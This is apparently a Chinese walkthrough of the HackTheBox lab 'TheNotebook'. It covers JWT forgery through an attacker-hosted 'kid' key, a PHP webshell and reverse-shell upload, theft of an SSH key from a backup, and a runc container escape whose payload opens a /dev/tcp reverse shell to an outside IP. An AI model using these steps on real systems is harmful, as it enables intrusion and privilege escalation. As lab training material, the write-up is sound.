![16281265772270.jpg](https://image.3001.net/images/20210806/1628218202_610ca35a0e1e7077f0bcf.jpg!small)

信息收集

    
    
    E:\nmap-7.91>nmap.exe -sS -sC -sV 10.10.10.230
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 09:26 
    Nmap scan report for bogon (10.10.10.230)
    Host is up (0.38s latency).
    Not shown: 997 closed ports
    PORT      STATE    SERVICE VERSION
    22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
    |   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
    |_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
    80/tcp    open     http    nginx 1.14.0 (Ubuntu)
    |_http-server-header: nginx/1.14.0 (Ubuntu)
    |_http-title: The Notebook - Your Note Keeper
    10010/tcp filtered rxapi
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 145.17 seconds
    

进入80端口

此处有注册和登录功能。随便注册登录，它会分配一个uuid和一个cookie。发现是jwt（需要burp安装JSON WEB TOKENS扩展，或者去
jwt.io 网站上解码），注册的普通用户admin_cap是0，猜测是需要攻击JWT成为admin。  
![16281283918849.jpg](https://image.3001.net/images/20210806/1628218240_610ca380be224ae2b1820.jpg!small)

创建一个新的rsa密钥对

并将 "admin_cap":0 更改为 "admin_cap":1。  
添加jwtRS256.key.pub和jwtRS256.key，并将jwtRS256.key更改为'privKey.key'

    
    
    ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
    #使用空密码
    openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
    
    #生成密钥对jwtRS256.key和jwtRS256.key.pub
    mv jwtRS256.key privKey.key
    cat jwtRS256.key.pub
    cat jwtRS256.key
    
    {
      "typ": "JWT",
      "alg": "RS256",
      "kid": "http://10.10.14.20:7070/privKey.key"
    }
    
    {
      "username": "olk",
      "email": "olk@123.com",
      "admin_cap": 1
    }
    

粘贴公私钥，生成jwt。  
![16281454870404.jpg](https://image.3001.net/images/20210806/1628218261_610ca3959b85e47262561.jpg!small)  
使用burp发送，同时用python开启一个http服务，可以看到我们的密钥被选中。（期间python提供的jwt key
server要一直开着，因为每次请求都会有一次对key的请求）  
![16281462640280.jpg](https://image.3001.net/images/20210806/1628218278_610ca3a643ff40f3be52c.jpg!small)  
![16281464504460.jpg](https://image.3001.net/images/20210806/1628218288_610ca3b0c92e230182464.jpg!small)  
现在我们有了管理员权限，但是每次切换页面或发送一些请求时都会更改cookie，所以只能再一次使用burp切换cookie访问不同的页面。

按上述方法切换到admin页面，发现上传文件。

![16281473070994.jpg](https://image.3001.net/images/20210806/1628218302_610ca3be72d16f9055750.jpg!small)上传php马，得到一个webshell。  
![16281478015985.jpg](https://image.3001.net/images/20210806/1628218317_610ca3cda4db2a6b686fe.jpg!small)  
由于隔一段时间上传的马就会被删。所以重新上传一个php-reveshell的马。

将kali中自带的php反弹shell马复制过来。

    
    
    cp /usr/share/webshells/php/php-reverse-shell.php nbook.php
    

![16281512680495.jpg](https://image.3001.net/images/20210806/1628218330_610ca3da52f89cabe1187.jpg!small)

枚举本地用户

    
    
    $ cat /etc/passwd | grep -v nologin
    root:x:0:0:root:/root:/bin/bash
    sync:x:4:65534:sync:/bin:/bin/sync
    lxd:x:105:65534::/var/lib/lxd/:/bin/false
    pollinate:x:109:1::/var/cache/pollinate:/bin/false
    noah:x:1000:1000:Noah:/home/noah:/bin/bash
    

在/var/backups下发现 home.tar.gz 文件。  
![16281515931396.jpg](https://image.3001.net/images/20210806/1628218343_610ca3e76294fb53e592f.jpg!small)将其下载到本地来查看。  
![16281517740243.jpg](https://image.3001.net/images/20210806/1628218356_610ca3f44d6e41b8387f9.jpg!small)本地下载后解压不成功。  
![16281527186983.jpg](https://image.3001.net/images/20210806/1628218368_610ca4002bf23c3e86620.jpg!small)换到蚁剑进行下载解压。  
![16281754977312.jpg](https://image.3001.net/images/20210806/1628218378_610ca40ab4797ed4b9750.jpg!small)解压发现是用户noah的home目录备份，在里面找到ssh密钥。

    
    
    $ cd /var/backups
    $ cp home.tar.gz /tmp
    $ cd /tmp
    $ ls
    home.tar.gz
    systemd-private-3ff198c384b049d39bc119fb78e3098b-systemd-timesyncd.service-uUWp74
    vmware-root_812-2957648972
    $ gunzip home.tar.gz
    $ tar -xf home.tar
    $ cd home
    $ ls
    noah
    $ cd noah
    $ ls -al
    total 32
    drwxr-xr-x 5 www-data www-data 4096 Feb 17 09:02 .
    drwxr-xr-x 3 www-data www-data 4096 Feb 12 06:24 ..
    -rw-r--r-- 1 www-data www-data  220 Apr  4  2018 .bash_logout
    -rw-r--r-- 1 www-data www-data 3771 Apr  4  2018 .bashrc
    drwx------ 2 www-data www-data 4096 Feb 16 10:47 .cache
    drwx------ 3 www-data www-data 4096 Feb 12 06:25 .gnupg
    -rw-r--r-- 1 www-data www-data  807 Apr  4  2018 .profile
    drwx------ 2 www-data www-data 4096 Feb 17 08:59 .ssh
    $ cd .ssh                                                                                   
    $ ls                                                                                        
    authorized_keys                                                                               
    id_rsa                                                                                         
    id_rsa.pub  
    

SSH连接

进入到noah文件夹下。

    
    
    ssh noah@10.10.10.230 -i id_rsa
    

发现user.txt文件。  
![16281766473524.jpg](https://image.3001.net/images/20210806/1628218398_610ca41ee615201bb9578.jpg!small)

docker逃逸漏洞

    
    
    var payload = "#!/bin/bash \n bash -i &>/dev/tcp/10.10.14.20/5678 <&1"
    
    # 编译
    CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
    

修改payload。  
![16281785995498.jpg](https://image.3001.net/images/20210806/1628218411_610ca42bce9b9f5fe1656.jpg!small)开启一个http服务。  
![16281797103244.jpg](https://image.3001.net/images/20210806/1628218421_610ca435660116de19c6f.jpg!small)![16281796833911.jpg](https://image.3001.net/images/20210806/1628218427_610ca43b55730fd307cad.jpg!small)在另一个终端里去触发。

    
    
    sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
    

![16281802451768.jpg](https://image.3001.net/images/20210806/1628218442_610ca44ab4c9d131dfb12.jpg!small)触发后会执行payload，可以发现root
flag。

在操作过程中我的shell未成功回弹，所以本次靶机到此结束。

参考链接：

    
    
    https://darkwing.moe/2021/03/08/TheNotebook-HackTheBox/#JWT
    https://maoutis.github.io/writeups/HackTheBox/2021-07-31-TheNotebook/
    https://blog.csdn.net/lhh134/article/details/104107776
    https://github.com/Frichetten/CVE-2019-5736-PoC
    

